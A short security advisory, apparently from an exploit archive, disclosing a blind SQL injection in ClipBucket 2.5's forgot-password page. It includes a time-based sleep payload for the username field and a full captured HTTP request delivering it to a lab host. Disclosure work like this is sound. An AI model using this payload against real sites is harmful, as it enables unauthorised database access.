@@ -1,0 +1,37 @@
+# Author: loneferret of Offensive Security
+# Product: ClipBucket
+# Version: 2.5 (and maybe older versions)
+# Vendor Site: http://clip-bucket.com/
+# Software Download: http://sourceforge.net/projects/clipbucket/
+
+# Software description:
+# ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.This script comes with all
+# the bells & whistles required to start your own Video Sharing website like Youtube, Metacafe, Veoh, Hulu or any
+# other top video distribution application in matter of minutes. ClipBucket is fastest growing script which was
+# first started as Youtube Clone but now its advance features & enhancements makes it the most versatile, reliable &
+# scalable media distribution platform with latest social networking features, while staying light on your pockets.
+# Whether you are a small fan club or a big Multi Tier Network operator, Clipbucket will fulfill your video
+# management needs.
+ 
+# Vulnerability:
+# Blind SQLi
+# Due to improperly sanitized user input a SQL Injection is present in the "Forgot Password" page.
+
+# PoC:
+# Page: http://<server>/forgot.php
+# Field: Username
+# Payload: -1' or sleep(5) and '1'='1
+
+# Host: 172.16.194.148
+# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+# Accept-Language: en-us,en;q=0.5
+# Accept-Encoding: gzip, deflate
+# DNT: 1
+# Connection: keep-alive
+# Referer: http://172.16.194.148/upload/forgot.php
+# Cookie: quick_list_box=show; current_style=list_view; sess_salt=5f3f5; fws_guest=81172578; sk-id=-305383665; PHPSESSID=0c1519dace9f217955cdc58ac55b28b2
+# Content-Type: application/x-www-form-urlencoded
+# Content-Length: 68
+
+# forgot_username=-1%27+or+sleep%285%29+and+%271%27%3D%271&reset=Reset
